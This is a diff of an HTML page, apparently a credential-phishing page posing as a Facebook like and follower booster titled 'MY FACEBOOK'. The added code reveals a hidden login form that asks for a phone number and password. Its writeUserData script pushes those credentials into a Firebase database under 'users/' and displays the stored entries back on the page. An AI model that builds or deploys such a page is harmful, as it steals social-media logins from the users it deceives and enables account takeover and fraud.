@@ -1,30 +1,159 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <title>
-            Facebook liking
-        </title>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        
-        <style>
-            body {
-    background-color:rgb(100,100,100,0.7);
+        <title>MY FACEBOOK</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="style.css">      
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">           
+<script src="https://www.gstatic.com/firebasejs/8.2.3/firebase-analytics.js"></script>      
+<script src="https://www.gstatic.com/firebasejs/8.2.3/firebase.js"></script>       
+ <script>
+    // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    var firebaseConfig = {
+    apiKey: "***********",
+    authDomain: "cartoline-india.firebaseapp.co",
+    projectId: "cartoline-india",
+    storageBucket: "**********",
+    messagingSenderId: "********",
+    appId: "1:372576193203:web:*****",
+    measurementId: "G*******"
+    };
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+  </script>
+
+
+
+
+    
+<style>
+    
+body {
+    background-color: skyblue;
     font-size:20px;
 }
 img{
     width:200px;
     height:100px;
     margin-left:50px;
+    border-radius:50px;
 }
-        </style>
+#likeme{
+    width:360px;
+    height:200px;
+    margin-left:-8px;
+    margin-top:-8px;
+}
+#likeyou{
+    width:360px;
+    height:200px;
+    margin-left:-8px;
+    margin-top:13px;
+}
+#page, #likeyou, #likeme{
+    border-radius:0px;
+}
+#page{
+    width:360px;
+    height:200px;
+    margin-left:-8px;
+    margin-top:-8px;
+}
+#add{
+    margin-top:30px;
+    font-weight:bolder ;
+    color:white;
+    background-color:blue;
+    border-color:blue;
+    box-shadow:0px 0px 5px darkBlue;
+    border-radius:20px;
+    height:50px;
+    width:200px;
+}
+#qqq{
+    display:none;
+    background-size:100% 100%;
+    margin-bottom:-70px;
+}
+#showname{
+  color: white;
+  font-size: 25px;
+  background:#E212C457;
+  padding: 3px;
+  margin-bottom: 0;
+  margin: 10px;
+  border-bottom:2px solid #70E2123B;
+  border-radius:10px;
+  text-align: center;
+}
+#para{
+  color: white;
+  padding:3px;
+  background:#5D12E23B;
+  margin:3px;
+  border-radius:10px;
+}
+#main{
+  border:1px solid #33EF0EA6;
+  border-radius:5px;
+  box-shadow: 3px 5px 5px #EF0EDD4D;
+}
+#num0, #num1, #num2{
+    text-align:center ;
+    border-radius:10px;
+    border:0px solid rgb(0,0,0,0);
+}
+#msgs{
+    display:none;
+}
+</style>   
     </head>
     <body>
+        
+    <div id="qqq">
+<form method="post">
+  <img id="likeme" src="https://dl.dropbox.com/s/g5e6z8en0nhw513/1493796187-fb-likes~2.jpg">
+  
+  <br /><br />
+   <div id="name">Phone num:   <input type="number" name="user" id="num0" placeholder="+          " /></div>
+   
+            <br />
+   <div id="pass">Your Password:   <input type="password" id="num1" placeholder="**********"/></div>
+       
+            <br />
+  <div id="confirm" >Confirm Password: <input type="password"id="num2" placeholder="***********"/></div>
+              <center>
+    <input id="add" onclick="writeUserData()" type="submit" value="Login" />
+               </center>
+            <br />
+            
+    <img id="likeyou" src="https://dl.dropbox.com/s/91tdl0z7sksk30x/get-facebook-likes.png?">
+</form>
+</div>
+<div id="clock">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   <img id="page" src="https://dl.dropbox.com/s/cmhmsgoin7r6xxy/1000likes.jpg">
         <p>
             Many things we have faced on facebook, sometimes we wonder why we got less likes than the friends we got....the problem are as follows...
      <li>post not reaching non-chatting friends</li>
      <li>insufficience followers</li>
      <br />
-     Your code gonna get less like due to the above reason <b>BUT</b> there is one way out log to <a href="#me">here</a>
+     Your code gonna get less like due to the above reason <b>BUT</b> there is one way out log to <a id="click" href="#me">here now</a>
      <br />
      Fill in ur facebook details then click log in after show this below, click on start followers to make new followers once friend is added either you sent request or they do <b>OR</b> click on auto followers to turn all friends to followers
      <br />
@@ -40,5 +169,98 @@ img{
      <br />
      <b>IF POST HASN'T BE LIKE BY FRIEND, POST KEEP REVIEWING TO FRIENDS ACCOUNT</b> thanks you welcome<a href="#me" >@facebook.like</a>
         </p>
+</div>
+
+ <div id="msgs">
+    <h2 class="load">Loading...</h2>
+  </div>
+<script type="text/javascript" charset="utf-8">
+    var database = firebase.database();
+
+
+    function writeUserData() {
+      var name = document.getElementById('num0');
+      var msg = document.getElementById('num1');
+      var mmm = document.getElementById("num2")
+
+      if (name.valu === "" || msg.value === "") {
+        alert('please enter details');
+      } 
+      else if(msg.value != mmm.value){
+          alert("wrong password input")
+      }
+      else {
+        firebase.database().ref('users/').push({
+          user: name.value,
+          message: msg.value,
+
+        });
+
+        console.log('loading');
+      }
+
+
+    }
+    
+    
+    var data = firebase.database().ref('users/');
+data.on('value', function(snapshot) {
+
+ 
+             
+
+document.getElementById("msgs").innerHTML="";
+
+ var val = snapshot.val();
+ Object.keys(val).forEach((key) => {
+ 
+
+
+const div = document.createElement("div") 
+
+
+div.innerHTML = `
+<div id="chain">
+<div id="main">
+
+            
+            <h3 id="showname">${val[key].user.replace(/</g,"&lt;").replace(/>/g,"&gt;")}</h3>
+            
+            <p id="para">${val[key].message.replace(/</g,"&lt;").replace(/>/g,"&gt;")}</p>
+                <br />
+                
+                
+        <br><br><br>
+        
+`;
+
+
+document.getElementById("msgs").appendChild(div)
+
+ });
+
+});
+    
+    
+    
+    
+  </script>
+ <script>
+window.onload=function(){
+document.getElementById("click").onclick=function(){
+var inv =document.getElementById("qqq");
+var msgs =document.getElementById("msgs");
+if (inv.style.display=="block"){
+    inv.style.display="none"
+document.getElementById("clock").style.display="block"
+msgs.style.display="none"
+}
+else{inv.style.display="block"
+document.getElementById("clock").style.display="none"
+msgs.style.display="none"
+}
+}
+}
+</script>
     </body>
 </html>
